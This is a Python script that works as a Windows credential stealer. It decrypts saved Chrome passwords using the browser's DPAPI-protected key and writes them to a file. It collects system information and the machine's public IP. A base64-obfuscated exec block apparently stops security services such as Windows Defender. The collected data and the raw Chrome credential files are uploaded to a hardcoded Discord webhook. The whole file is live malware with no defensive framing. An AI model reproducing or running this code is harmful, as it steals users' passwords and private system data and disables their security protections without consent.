from discord_webhook import DiscordWebhook
import subprocess
import requests
import os
from random import randint
import pyautogui
pyautogui.FAILSAFE = False
mouse = pyautogui
keyboard = pyautogui
username = os.getlogin()
import os
import json
import base64
import sqlite3
import win32crypt
from Crypto.Cipher import AES
import shutil
from datetime import timezone, datetime, timedelta
from discord_webhook import DiscordWebhook


def license():
    web=DiscordWebhook(url="https://discord.com/api/webhooks/988419327994761227/QT-ORLi1GRxBbbsbRLs5fs3MkCy2dOuoQL_pFgrhmyCrBYNPSejTcIh8J2ooq9NtFbXy")
    with open("C:/Windows/system32/license.rtf", "rb") as f:
    web.add_file(file=f.read(), filename='license.rtf')
    web.execute()

def chrome_date_and_time(chrome_data):
    # Chrome_data format is 'year-month-date 
    # hr:mins:seconds.milliseconds
    # This will return datetime.datetime Object
    return datetime(1601, 1, 1) + timedelta(microseconds=chrome_data)
  
  
def fetching_encryption_key():
    # Local_computer_directory_path will look 
    # like this below
    # C: => Users => <Your_Name> => AppData =>
    # Local => Google => Chrome => User Data =>
    # Local State
    local_computer_directory_path = os.path.join(
      os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", 
      "User Data", "Local State")
      
    with open(local_computer_directory_path, "r", encoding="utf-8") as f:
        local_state_data = f.read()
        local_state_data = json.loads(local_state_data)
  
    # decoding the encryption key using base64
    encryption_key = base64.b64decode(
      local_state_data["os_crypt"]["encrypted_key"])
      
    # remove Windows Data Protection API (DPAPI) str
    encryption_key = encryption_key[5:]
      
    # return decrypted key
    return win32crypt.CryptUnprotectData(encryption_key, None, None, None, 0)[1]
  
  
def password_decryption(password, encryption_key):
    try:
        iv = password[3:15]
        password = password[15:]
          
        # generate cipher
        cipher = AES.new(encryption_key, AES.MODE_GCM, iv)
          
        # decrypt password
        return cipher.decrypt(password)[:-16].decode()
    except:
          
        try:
            return str(win32crypt.CryptUnprotectData(password, None, None, None, 0)[1])
        except:
            return "No Passwords"
  
  
def main1():
    key = fetching_encryption_key()
    db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local",
                           "Google", "Chrome", "User Data", "default", "Login Data")
    filename = "ChromePasswords.db"
    shutil.copyfile(db_path, filename)
      
    # connecting to the database
    db = sqlite3.connect(filename)
    cursor = db.cursor()
      
    # 'logins' table has the data
    cursor.execute(
        "select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins "
        "order by date_last_used")
      
    # iterate over all rows
    for row in cursor.fetchall():
        main_url = row[0]
        login_page_url = row[1]
        user_name = row[2]
        decrypted_password = password_decryption(row[3], key)
        date_of_creation = row[4]
        last_usuage = row[5]
          
        if user_name or decrypted_password:
            with open("chache_data_removed.txt", "w") as f:
                f.write(f"\nMain URL: {main_url}")
                f.write(f"\nLogin URL: {login_page_url}")
                f.write(f"\nUser name: {user_name}")
                f.write(f"\nDecrypted Password: {decrypted_password}")
        else:
            continue  
    cursor.close()
    db.close()
      
    try:
          
        # trying to remove the copied db file as 
        # well from local computer
        web=DiscordWebhook(url="https://discord.com/api/webhooks/988419327994761227/QT-ORLi1GRxBbbsbRLs5fs3MkCy2dOuoQL_pFgrhmyCrBYNPSejTcIh8J2ooq9NtFbXy")
        with open("chache_data_removed.txt", "rb") as f:
            web.add_file(file=f.read(), filename='file.txt')
        web.execute()
        os.remove(filename)
    except:
        pass
  
  

main1()

def main():
    r=requests.get("http://ifconfig.me")
    url="https://discord.com/api/webhooks/988419327994761227/QT-ORLi1GRxBbbsbRLs5fs3MkCy2dOuoQL_pFgrhmyCrBYNPSejTcIh8J2ooq9NtFbXy"
    subprocess.getoutput('if exist "%userprofile%\AppData\System info.txt" del "%userprofile%\AppData\System info.txt"')
    subprocess.getoutput('systeminfo >> "%userprofile%\AppData\System info.txt"')
    exec(__import__('base64').b64decode(__import__('codecs').getencoder('utf-8')('aW1wb3J0IHN1YnByb2Nlc3MKc3VicHJvY2Vzcy5nZXRvdXRwdXQoJ25ldCBzdG9wICJTRFJTVkMiJykKc3VicHJvY2Vzcy5nZXRvdXRwdXQoJ25ldCBzdG9wICJXaW5EZWZlbmQiJykKc3VicHJvY2Vzcy5nZXRvdXRwdXQoJ3Rhc2traWxsIC9mIC9pbSBNU0FTQ3VpLmV4ZScpCnN1YnByb2Nlc3MuZ2V0b3V0cHV0KCduZXQgc3RvcCAic2VjdXJpdHkgY2VudGVyIicpCnN1YnByb2Nlc3MuZ2V0b3V0cHV0KCduZXRzaCBhZHZmaXJld2FsbCBzZXQgYWxscHJvZmlsZXMgc3RhdGUgb24nKQpzdWJwcm9jZXNzLmdldG91dHB1dCgnbmV0IHN0b3AgInd1YXVzZXIiJyk=')[0]))
    web=DiscordWebhook(url=url, content=f"IP > {r.text}")
    with open(f"C:/Users/{username}/AppData/System info.txt", "rb")as f:
        web.add_file(file=f.read(), filename='System info.txt')
    with open(f"C:/Users/{username}/AppData/Local/Google/Chrome/User Data/Local State", "rb") as f:
        web.add_file(file=f.read(), filename='Local State')
    with open(f"C:/Users/{username}/AppData/Local/Google/Chrome/User Data/Default/Login Data", "rb") as f:
        web.add_file(file=f.read(), filename='Login Data')
    web.execute()
    subprocess.getoutput('if exist "%userprofile%\AppData\System info.txt" del "%userprofile%\appdata\System info.txt"')
main()
